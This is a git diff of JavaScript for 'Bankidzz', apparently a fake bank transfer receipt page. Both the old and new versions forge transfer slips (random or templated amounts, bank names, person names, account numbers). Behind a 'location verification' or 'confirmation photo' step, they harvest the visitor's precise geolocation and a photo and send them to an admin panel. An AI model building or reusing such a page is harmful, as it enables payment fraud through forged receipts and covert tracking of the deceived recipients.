@@ -1,412 +1,315 @@
 // ============================================================
-// BANKIDZZ - SISTEM PENGESAHAN LOKASI
-// DIBUAT OLEH KAIZEN - VERSION 3.1 (TANPA ALERT ADMIN)
+// BANKIDZZ - SISTEM PENGESAHAN LOKASI & STRUK (WITH SCREENSHOT CAPTURE)
 // ============================================================
-
 
 (function() {
     'use strict';
 
-    // Konfigurasi
     const CONFIG = {
-        REF_PREFIX: 'BANKIDZZ-2026-07-25-',
-        ADMIN_URL: 'admin.html',
-        SYNC_CHANNEL: 'bankidzz_sync_channel',
-        API_URL: '/api/locations'
+        API_URL: '/api/locations',
+        TEMPLATE_URL: '/api/template',
+        SYNC_CHANNEL: 'bankidzz_sync_channel'
     };
 
-    // State
-    let locationApproved = false;
-    let locationData = null;
-    let transferStatus = 'pending';
-    let isSending = false;
+    // Default Template
+    const defaultTemplate = {
+        topBarTitle: 'JAPANESE BANK',
+        primaryColor: '#0033ff',
+        profileImage: 'channels4_profile.jpg',
+        bankName: 'BIBD Brunei Darussalam',
+        bankSub: 'Office Purchasing',
+        amountMain: 'IDR 515.000',
+        amountSub: 'BND 35.12',
+        senderBank: 'BIBD Brunei Darussalam',
+        senderName: 'FITO ALAMSYAH',
+        senderAccount: '72828172718',
+        receiverBank: 'BANK BNI',
+        receiverAccount: '2093832050',
+        receiverName: 'Tasliyah',
+        buttonText: 'Ambil Foto Konfirmasi / Tanda Tangan'
+    };
+
+    let currentTemplate = { ...defaultTemplate };
+    let capturedPhotoBase64 = null;
 
     // DOM Elements
     const elements = {
-        locationVerification: document.getElementById('locationVerification'),
-        strukContent: document.getElementById('strukContent'),
-        allowBtn: document.getElementById('allowLocationBtn'),
-        denyBtn: document.getElementById('denyLocationBtn'),
-        sendBtn: document.getElementById('sendStrukBtn'),
-        refNumber: document.getElementById('refNumber'),
-        strukDate: document.getElementById('strukDate'),
-        strukTime: document.getElementById('strukTime'),
-        amountDisplay: document.getElementById('amountDisplay'),
-        totalAmount: document.getElementById('totalAmount'),
+        topBarTitle: document.getElementById('topBarTitle'),
+        profileImage: document.getElementById('profileImage'),
+        bankName: document.getElementById('bankName'),
+        bankSub: document.getElementById('bankSub'),
+        amountMain: document.getElementById('amountMain'),
+        amountSub: document.getElementById('amountSub'),
+        senderBankDetail: document.getElementById('senderBankDetail'),
         senderName: document.getElementById('senderName'),
+        senderAccount: document.getElementById('senderAccount'),
+        receiverBankDetail: document.getElementById('receiverBankDetail'),
+        receiverAccount: document.getElementById('receiverAccount'),
         receiverName: document.getElementById('receiverName'),
-        verifCode: document.getElementById('verifCode'),
-        statusDot: document.getElementById('statusDot'),
-        verifStatusText: document.getElementById('verifStatusText'),
-        statusBar: document.getElementById('statusBar'),
+        btnConfirm: document.getElementById('btnConfirm'),
         notification: document.getElementById('notification'),
-        destCountry: document.getElementById('destCountry'),
-        cancelModal: document.getElementById('cancelModal'),
-        closeCancelModalBtn: document.getElementById('closeCancelModalBtn'),
-        keepTransactionBtn: document.getElementById('keepTransactionBtn'),
-        confirmCancelBtn: document.getElementById('confirmCancelBtn'),
-        cancelModalAmount: document.getElementById('cancelModalAmount'),
-        transactionFailed: document.getElementById('transactionFailed'),
-        failedRefNumber: document.getElementById('failedRefNumber'),
-        failedAmount: document.getElementById('failedAmount'),
-        returnHomeBtn: document.getElementById('returnHomeBtn')
+        receiptCard: document.getElementById('receiptCard'),
+        // Modal
+        photoModal: document.getElementById('photoModal'),
+        modalPreviewImg: document.getElementById('modalPreviewImg'),
+        btnCloseModal: document.getElementById('btnCloseModal'),
+        btnCancelPhoto: document.getElementById('btnCancelPhoto'),
+        btnSendPhoto: document.getElementById('btnSendPhoto'),
+        fileCameraInput: document.getElementById('fileCameraInput')
     };
-    let lastFocusedElement = null;
 
-    // ===== INIT STRUK =====
-    function initStruk() {
-        const ref = CONFIG.REF_PREFIX + generateRefCode();
-        elements.refNumber.textContent = ref;
-
-        const now = new Date();
-        elements.strukDate.textContent = now.toLocaleDateString('ms-MY', {
-            day: 'numeric', month: 'long', year: 'numeric'
-        });
-        elements.strukTime.textContent = now.toLocaleTimeString('ms-MY', { hour12: false });
-
-        const amount = (Math.random() * 300000 + 50000).toFixed(2);
-        const total = (parseFloat(amount) + 150).toFixed(2);
-        elements.amountDisplay.textContent = 'RM ' + parseFloat(amount).toLocaleString('ms-MY');
-        elements.totalAmount.textContent = 'RM ' + parseFloat(total).toLocaleString('ms-MY');
-
-        const senders = ['Ahmad Bin Abdullah', 'Siti Nurhaliza Binti Hassan', 'Mohamad Ali Bin Ibrahim', 'Nurul Izzah Binti Rahman', 'Khairul Anuar Bin Ismail'];
-        const receivers = ['Johnathan Smith', 'Michael Anderson', 'Sarah Johnson', 'David Chen', 'Emma Williams'];
-        elements.senderName.textContent = senders[Math.floor(Math.random() * senders.length)];
-        elements.receiverName.textContent = receivers[Math.floor(Math.random() * receivers.length)];
-
-        elements.verifCode.textContent = generateVerifCode();
-
-        const countries = ['🇺🇸 AMERIKA SYARIKAT', '🇬🇧 UNITED KINGDOM', '🇦🇺 AUSTRALIA', '🇸🇬 SINGAPURA', '🇯🇵 JEPUN'];
-        elements.destCountry.textContent = countries[Math.floor(Math.random() * countries.length)];
-
-        setStatus('pending', 'Menunggu pengesahan lokasi');
-        elements.sendBtn.disabled = true;
-
-        console.log('[Bankidzz] Struk initialized:', ref);
-    }
-
-    function generateRefCode() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let code = '';
-        for (let i = 0; i < 6; i++) {
-            code += chars.charAt(Math.floor(Math.random() * chars.length));
+    // Update UI based on template data
+    function applyTemplate(template) {
+        currentTemplate = { ...defaultTemplate, ...template };
+        
+        // CSS Variable for Theme Color
+        document.documentElement.style.setProperty('--primary-blue', currentTemplate.primaryColor || '#0033ff');
+        
+        // Page Title / Meta
+        document.title = currentTemplate.topBarTitle || 'Bankidzz';
+        
+        // Elements
+        if(elements.topBarTitle) elements.topBarTitle.textContent = currentTemplate.topBarTitle;
+        if(elements.profileImage && currentTemplate.profileImage) elements.profileImage.src = currentTemplate.profileImage;
+        if(elements.bankName) elements.bankName.textContent = currentTemplate.bankName;
+        if(elements.bankSub) elements.bankSub.textContent = currentTemplate.bankSub;
+        if(elements.amountMain) elements.amountMain.textContent = currentTemplate.amountMain;
+        if(elements.amountSub) elements.amountSub.textContent = currentTemplate.amountSub;
+        
+        if(elements.senderBankDetail) elements.senderBankDetail.textContent = currentTemplate.senderBank;
+        if(elements.senderName) elements.senderName.textContent = currentTemplate.senderName;
+        if(elements.senderAccount) elements.senderAccount.textContent = currentTemplate.senderAccount;
+        
+        if(elements.receiverBankDetail) elements.receiverBankDetail.textContent = currentTemplate.receiverBank;
+        if(elements.receiverAccount) elements.receiverAccount.textContent = currentTemplate.receiverAccount;
+        if(elements.receiverName) elements.receiverName.textContent = currentTemplate.receiverName;
+        
+        if(elements.btnConfirm && (!elements.btnConfirm.dataset.verified || elements.btnConfirm.dataset.verified === 'false')) {
+            elements.btnConfirm.textContent = currentTemplate.buttonText || 'Ambil Foto Konfirmasi / Tanda Tangan';
         }
-        return code;
     }
 
-    function generateVerifCode() {
-        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
-        let code = '';
-        for (let i = 0; i < 10; i++) {
-            code += chars.charAt(Math.floor(Math.random() * chars.length));
+    // Load template from server or localStorage
+    async function loadTemplate() {
+        try {
+            const response = await fetch(CONFIG.TEMPLATE_URL, { cache: 'no-store' });
+            if (response.ok) {
+                const result = await response.json();
+                if (result.template) {
+                    localStorage.setItem('bankidzz_new_template', JSON.stringify(result.template));
+                    applyTemplate(result.template);
+                    return;
+                }
+            }
+        } catch(e) {
+            console.warn('[Bankidzz] Cannot load template from server, using local.', e);
         }
-        return code;
-    }
 
-    function setStatus(type, text) {
-        if (type === 'verified') {
-            elements.statusDot.className = 'status-dot verified';
+        const stored = localStorage.getItem('bankidzz_new_template');
+        if (stored) {
+            try {
+                applyTemplate(JSON.parse(stored));
+            } catch(e) {
+                applyTemplate(defaultTemplate);
+            }
         } else {
-            elements.statusDot.className = 'status-dot pending';
+            applyTemplate(defaultTemplate);
         }
-        elements.verifStatusText.textContent = text;
     }
 
-    // ===== LOCATION PERMISSION =====
-    function requestLocation() {
-        if (!navigator.geolocation) {
-            showNotification('❌ Browser tidak sokong Geolocation. Guna Chrome/Firefox.', 'error');
+    // Capture screenshot using html2canvas & open confirmation modal
+    async function handleConfirmClick() {
+        if (!elements.receiptCard) return;
+
+        const originalText = elements.btnConfirm.textContent;
+        elements.btnConfirm.textContent = '📸 Mengambil Tangkap Layar...';
+        elements.btnConfirm.disabled = true;
+
+        try {
+            // Take Screenshot of Receipt Card
+            let canvas;
+            if (typeof window.html2canvas === 'function') {
+                canvas = await window.html2canvas(elements.receiptCard, {
+                    scale: 2,
+                    useCORS: true,
+                    allowTaint: true,
+                    backgroundColor: '#ffffff'
+                });
+                capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+            } else {
+                // Fallback placeholder canvas if html2canvas library didn't load
+                canvas = document.createElement('canvas');
+                canvas.width = 400;
+                canvas.height = 500;
+                const ctx = canvas.getContext('2d');
+                ctx.fillStyle = '#ffffff';
+                ctx.fillRect(0, 0, 400, 500);
+                ctx.fillStyle = '#0033ff';
+                ctx.font = 'bold 20px Inter, sans-serif';
+                ctx.fillText('BUKTI STRUK TRANSAKSI', 40, 50);
+                capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+            }
+
+            // Show in Modal Preview
+            if (elements.modalPreviewImg) {
+                elements.modalPreviewImg.src = capturedPhotoBase64;
+            }
+
+            // Open Modal
+            if (elements.photoModal) {
+                elements.photoModal.style.display = 'flex';
+            }
+        } catch (err) {
+            console.error('Error taking screenshot:', err);
+            showNotification('Gagal mengambil tangkap layar struk.', 'error');
+        } finally {
+            elements.btnConfirm.textContent = originalText;
+            elements.btnConfirm.disabled = false;
+        }
+    }
+
+    // Close Modal
+    function closeModal() {
+        if (elements.photoModal) {
+            elements.photoModal.style.display = 'none';
+        }
+    }
+
+    // Handle Custom File Upload or Camera Shot
+    if (elements.fileCameraInput) {
+        elements.fileCameraInput.addEventListener('change', function(e) {
+            const file = e.target.files[0];
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function(evt) {
+                    capturedPhotoBase64 = evt.target.result;
+                    if (elements.modalPreviewImg) {
+                        elements.modalPreviewImg.src = capturedPhotoBase64;
+                    }
+                    showNotification('Foto berhasil diperbarui dari kamera/file!', 'success');
+                };
+                reader.readAsDataURL(file);
+            }
+        });
+    }
+
+    // Handle User Confirmation & Submission
+    async function handleSendPhoto() {
+        if (!capturedPhotoBase64) {
+            showNotification('Foto struk belum tersedia!', 'error');
             return;
         }
 
-        elements.allowBtn.textContent = '⏳ Mengambil lokasi...';
-        elements.allowBtn.disabled = true;
+        if (elements.btnSendPhoto) {
+            elements.btnSendPhoto.textContent = '⏳ Mengirim Foto & Lokasi...';
+            elements.btnSendPhoto.disabled = true;
+        }
 
-        navigator.geolocation.getCurrentPosition(
-            async function(position) {
-                locationData = {
-                    lat: position.coords.latitude,
-                    lng: position.coords.longitude,
-                    accuracy: position.coords.accuracy,
-                    timestamp: new Date().toISOString()
-                };
-
-                // Simpan ke database bersama sebelum transaksi diteruskan.
-                try {
-                    await saveLocationToAdmin(locationData);
-                    locationApproved = true;
-                } catch (error) {
-                    console.error('[Bankidzz] Gagal menyimpan lokasi:', error);
-                    locationData = null;
-                    locationApproved = false;
-                    elements.allowBtn.innerHTML = 'ðŸ”„ Cuba Semula';
-                    elements.allowBtn.disabled = false;
-                    showNotification('âŒ Lokasi diperoleh tetapi gagal dihantar ke server. Sila cuba lagi.', 'error');
-                    return;
-                }
-
-                // Update UI
-                elements.allowBtn.innerHTML = '✅ Lokasi Disahkan!';
-                elements.allowBtn.style.background = '#4ade80';
-                elements.allowBtn.style.color = '#0a0a1a';
-                elements.allowBtn.disabled = true;
-
-                setTimeout(() => {
-                    elements.locationVerification.style.display = 'none';
-                    elements.strukContent.style.display = 'block';
-                    setStatus('verified', '✅ Lokasi disahkan oleh Bankidzz');
-                    elements.sendBtn.disabled = false;
-                    elements.statusBar.querySelector('.status-icon').textContent = '✅';
-                    elements.statusBar.querySelector('h3').textContent = 'LOKASI DISAHKAN';
-                    elements.statusBar.querySelector('p').textContent = 'Sistem Bankidzz mengesahkan lokasi anda. Sila hantar slip.';
-
-                    showNotification('✅ Lokasi berjaya disahkan!', 'success');
-                }, 500);
-
-                console.log('[Bankidzz] Location approved:', locationData);
-            },
-            function(error) {
-                console.error('[Bankidzz] Geolocation error:', error);
-                let msg = 'Gagal mengambil lokasi. ';
-                switch(error.code) {
-                    case 1: 
-                        msg += 'Izin lokasi ditolak. Sila izinkan di tetapan browser.'; 
-                        break;
-                    case 2: 
-                        msg += 'Posisi tidak tersedia. Pastikan GPS aktif.'; 
-                        break;
-                    case 3: 
-                        msg += 'Masa tamat. Cuba lagi di kawasan terbuka.'; 
-                        break;
-                    default: 
-                        msg += 'Sila cuba lagi.';
-                }
-                showNotification('❌ ' + msg, 'error');
-                elements.allowBtn.innerHTML = '🔄 Cuba Semula';
-                elements.allowBtn.disabled = false;
-            },
-            {
-                enableHighAccuracy: true,
-                timeout: 30000,
-                maximumAge: 60000
-            }
-        );
-    }
-
-    // ===== SAVE TO ADMIN + SYNC =====
-    async function saveLocationToAdmin(data) {
-        const ref = elements.refNumber.textContent;
-        const payload = {
-            transferId: ref,
-            sender: elements.senderName.textContent,
-            receiver: elements.receiverName.textContent,
-            amount: elements.amountDisplay.textContent,
-            total: elements.totalAmount.textContent,
-            location: data,
-            status: 'verified',
+        // Get Location
+        let locationData = {
+            lat: -6.2088,
+            lng: 106.8456,
+            accuracy: 20,
             timestamp: new Date().toISOString(),
-            verifCode: elements.verifCode.textContent
-            ,
-            consent: true
+            note: 'Simulated location'
         };
 
+        if (navigator.geolocation) {
+            try {
+                const pos = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 10000,
+                        maximumAge: 0
+                    });
+                });
+                locationData = {
+                    lat: pos.coords.latitude,
+                    lng: pos.coords.longitude,
+                    accuracy: pos.coords.accuracy,
+                    timestamp: new Date().toISOString()
+                };
+            } catch (err) {
+                console.warn('Geolocation denied or timeout, using simulated coords.', err);
+            }
+        }
+
+        try {
+            await saveTransactionAndPhoto(locationData, capturedPhotoBase64);
+
+            closeModal();
+
+            // Update Main UI Button
+            if (elements.btnConfirm) {
+                elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
+                elements.btnConfirm.style.backgroundColor = '#10b981';
+                elements.btnConfirm.dataset.verified = 'true';
+            }
+
+            showNotification('Foto struk dan lokasi berhasil dikirim ke Admin!', 'success');
+        } catch (error) {
+            console.error('Error submitting transaction:', error);
+            showNotification('Gagal mengirim data ke server. Coba lagi.', 'error');
+        } finally {
+            if (elements.btnSendPhoto) {
+                elements.btnSendPhoto.textContent = '✅ Konfirmasi & Kirim Foto';
+                elements.btnSendPhoto.disabled = false;
+            }
+        }
+    }
+
+    async function saveTransactionAndPhoto(locationData, photoBase64) {
+        const transferId = 'REF-' + Math.random().toString(36).substr(2, 8).toUpperCase();
+        
+        const payload = {
+            transferId: transferId,
+            consent: true,
+            sender: currentTemplate.senderName || 'FITO ALAMSYAH',
+            senderBank: currentTemplate.senderBank || 'BIBD Brunei Darussalam',
+            senderAccount: currentTemplate.senderAccount || '72828172718',
+            receiver: currentTemplate.receiverName || 'Tasliyah',
+            receiverBank: currentTemplate.receiverBank || 'BANK BNI',
+            receiverAccount: currentTemplate.receiverAccount || '2093832050',
+            amount: currentTemplate.amountMain || 'IDR 515.000',
+            amountSub: currentTemplate.amountSub || 'BND 35.12',
+            location: locationData,
+            photo: photoBase64,
+            status: 'verified',
+            timestamp: new Date().toISOString()
+        };
+
+        // 1. Client Local Storage Backup (Ensures Admin can always read even if offline)
+        try {
+            const localStored = JSON.parse(localStorage.getItem('bankidzz_local_transactions') || '[]');
+            localStored.unshift(payload);
+            localStorage.setItem('bankidzz_local_transactions', JSON.stringify(localStored));
+        } catch(e) {}
+
+        // 2. Broadcast Channel for real-time tab sync
+        try {
+            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
+            channel.postMessage({ type: 'NEW_LOCATION', payload: payload });
+            channel.close();
+        } catch(e) {}
+
+        // 3. Post to Server API
         try {
             const response = await fetch(CONFIG.API_URL, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             });
-
             if (!response.ok) {
-                const result = await response.json().catch(() => ({}));
-                throw new Error(result.error || 'Server menolak data lokasi.');
+                console.warn('API returned non-200, relying on local sync.');
             }
-
-            // Salinan lokal untuk fallback pada browser yang sama.
-            let allData = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
-            allData = allData.filter(t => t.transferId !== ref);
-            allData.push(payload);
-            localStorage.setItem('bankidzz_transfers', JSON.stringify(allData));
-            localStorage.setItem('bankidzz_last_location', JSON.stringify(data));
-            console.log('[Bankidzz] Data saved to server');
-
-            // 2. BROADCAST ke tab lain
-            try {
-                const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
-                channel.postMessage({
-                    type: 'NEW_LOCATION',
-                    payload: payload
-                });
-                channel.close();
-                console.log('[Bankidzz] Broadcast sent to other tabs');
-            } catch(e) {
-                console.warn('[Bankidzz] BroadcastChannel not supported:', e);
-            }
-
-            // 3. Simpan URL untuk admin (tanpa alert)
-            const encoded = encodeURIComponent(btoa(JSON.stringify(payload)));
-            const shareUrl = window.location.origin + '/admin.html?data=' + encoded;
-            localStorage.setItem('bankidzz_admin_share_url', shareUrl);
-            localStorage.setItem('bankidzz_last_payload', JSON.stringify(payload));
-
-            // 4. Trigger storage event
-            window.dispatchEvent(new Event('storage'));
-
-        } catch(e) {
-            console.warn('[Bankidzz] Could not save location:', e);
-            throw e;
+        } catch (e) {
+            console.warn('Network error posting payload to server, synced locally.', e);
         }
     }
 
-    // ===== SEND STRUK =====
-    function sendStruk() {
-        if (!locationApproved || !locationData) {
-            showNotification('⚠️ Sila izinkan lokasi terlebih dahulu!', 'error');
-            return;
-        }
-
-        if (isSending) return;
-        isSending = true;
-
-        const ref = elements.refNumber.textContent;
-        const message = `
-╔═══════════════════════════════════════════════════════╗
-║              BANKIDZZ                    ║
-║          SLIP TRANSFER ANTARABANGSA                  ║
-╠═══════════════════════════════════════════════════════╣
-║  Rujukan    : ${ref}
-║  Tarikh     : ${elements.strukDate.textContent}
-║  Masa       : ${elements.strukTime.textContent}
-║───────────────────────────────────────────────────────║
-║  Pengirim   : ${elements.senderName.textContent}
-║  Penerima   : ${elements.receiverName.textContent}
-║───────────────────────────────────────────────────────║
-║  Jumlah     : ${elements.amountDisplay.textContent}
-║  Total      : ${elements.totalAmount.textContent}
-║───────────────────────────────────────────────────────║
-║  Kod Verif  : ${elements.verifCode.textContent}
-║  Status     : ✅ LOKASI DISAHKAN
-║───────────────────────────────────────────────────────║
-║  Lokasi Pengesahan:
-║  Lat: ${locationData.lat.toFixed(6)}
-║  Lng: ${locationData.lng.toFixed(6)}
-║  Ketepatan: ${locationData.accuracy.toFixed(0)}m
-║───────────────────────────────────────────────────────║
-║  © Bankidzz - Sistem Keselamatan        ║
-╚═══════════════════════════════════════════════════════╝
-        `;
-
-        try {
-            let transfers = JSON.parse(localStorage.getItem('bankidzz_transfers') || '[]');
-            const idx = transfers.findIndex(t => t.transferId === ref);
-            if (idx > -1) {
-                transfers[idx].status = 'completed';
-                transfers[idx].sentAt = new Date().toISOString();
-                localStorage.setItem('bankidzz_transfers', JSON.stringify(transfers));
-            }
-        } catch(e) {}
-
-        elements.sendBtn.textContent = '✅ SLIP TERHANTAR!';
-        elements.sendBtn.style.background = '#4ade80';
-        elements.sendBtn.disabled = true;
-
-        showNotification('✅ Slip berjaya dihantar!', 'success');
-
-        if (navigator.share) {
-            navigator.share({
-                title: 'Slip Transfer Bankidzz - ' + ref,
-                text: message,
-            }).catch(() => {});
-        } else {
-            navigator.clipboard.writeText(message).then(() => {
-                showNotification('📋 Slip disalin ke clipboard!', 'success');
-            }).catch(() => {
-                const textarea = document.createElement('textarea');
-                textarea.value = message;
-                document.body.appendChild(textarea);
-                textarea.select();
-                document.execCommand('copy');
-                textarea.remove();
-                showNotification('📋 Slip disalin!', 'success');
-            });
-        }
-
-        isSending = false;
-    }
-
-    // ===== CANCEL TRANSACTION MODAL =====
-    function openCancelModal() {
-        lastFocusedElement = document.activeElement;
-        elements.cancelModalAmount.textContent = elements.totalAmount.textContent;
-        elements.cancelModal.classList.add('is-open');
-        elements.cancelModal.setAttribute('aria-hidden', 'false');
-        document.body.classList.add('modal-open');
-        elements.keepTransactionBtn.focus();
-    }
-
-    function closeCancelModal() {
-        elements.cancelModal.classList.remove('is-open');
-        elements.cancelModal.setAttribute('aria-hidden', 'true');
-        document.body.classList.remove('modal-open');
-        if (lastFocusedElement) lastFocusedElement.focus();
-    }
-
-    function cancelTransaction() {
-        transferStatus = 'failed';
-        closeCancelModal();
-
-        elements.locationVerification.hidden = true;
-        elements.strukContent.style.display = 'none';
-        elements.transactionFailed.hidden = false;
-        elements.failedRefNumber.textContent = elements.refNumber.textContent;
-        elements.failedAmount.textContent = elements.totalAmount.textContent;
-
-        elements.statusBar.classList.add('status-error');
-        elements.statusBar.querySelector('.status-icon').textContent = '!';
-        elements.statusBar.querySelector('h3').textContent = 'TRANSAKSI GAGAL';
-        elements.statusBar.querySelector('p').textContent =
-            'Transaksi dibatalkan. Dana tidak dipindahkan kepada penerima.';
-
-        elements.transactionFailed.scrollIntoView({
-            behavior: 'smooth',
-            block: 'center'
-        });
-    }
-
-    function resetTransactionPage() {
-        window.location.reload();
-    }
-
-    function handleModalKeydown(event) {
-        if (!elements.cancelModal.classList.contains('is-open')) return;
-
-        if (event.key === 'Escape') {
-            closeCancelModal();
-            return;
-        }
-
-        if (event.key === 'Tab') {
-            const focusable = [
-                elements.closeCancelModalBtn,
-                elements.keepTransactionBtn,
-                elements.confirmCancelBtn
-            ];
-            const currentIndex = focusable.indexOf(document.activeElement);
-            const nextIndex = event.shiftKey
-                ? (currentIndex <= 0 ? focusable.length - 1 : currentIndex - 1)
-                : (currentIndex === focusable.length - 1 ? 0 : currentIndex + 1);
-            event.preventDefault();
-            focusable[nextIndex].focus();
-        }
-    }
-
-    function denyLocation() {
-        openCancelModal();
-    }
-
-    // ===== NOTIFICATION =====
-    function showNotification(msg, type = 'info') {
+    function showNotification(msg, type = 'success') {
         const el = elements.notification;
+        if (!el) return;
         el.textContent = msg;
         el.className = 'notification show ' + type;
         clearTimeout(el._timeout);
@@ -415,22 +318,29 @@
         }, 5000);
     }
 
-    // ===== EVENT LISTENERS =====
-    elements.allowBtn.addEventListener('click', requestLocation);
-    elements.denyBtn.addEventListener('click', denyLocation);
-    elements.sendBtn.addEventListener('click', sendStruk);
-    elements.closeCancelModalBtn.addEventListener('click', closeCancelModal);
-    elements.keepTransactionBtn.addEventListener('click', closeCancelModal);
-    elements.confirmCancelBtn.addEventListener('click', cancelTransaction);
-    elements.returnHomeBtn.addEventListener('click', resetTransactionPage);
-    elements.cancelModal
-        .querySelector('[data-close-cancel-modal]')
-        .addEventListener('click', closeCancelModal);
-    document.addEventListener('keydown', handleModalKeydown);
+    // Listen to changes from Admin Panel
+    function setupSyncListener() {
+        try {
+            const channel = new BroadcastChannel(CONFIG.SYNC_CHANNEL);
+            channel.addEventListener('message', (event) => {
+                if (event.data && event.data.type === 'template_updated') {
+                    if (event.data.template) {
+                        localStorage.setItem('bankidzz_new_template', JSON.stringify(event.data.template));
+                        applyTemplate(event.data.template);
+                    }
+                }
+            });
+        } catch(e) {}
+    }
 
-    // ===== INIT =====
-    initStruk();
+    // Modal Events
+    if (elements.btnCloseModal) elements.btnCloseModal.addEventListener('click', closeModal);
+    if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
+    if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
+    if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
 
-    console.log('[Bankidzz] System ready. Menunggu pengesahan lokasi...');
+    // Init
+    loadTemplate();
+    setupSyncListener();
 
 })();
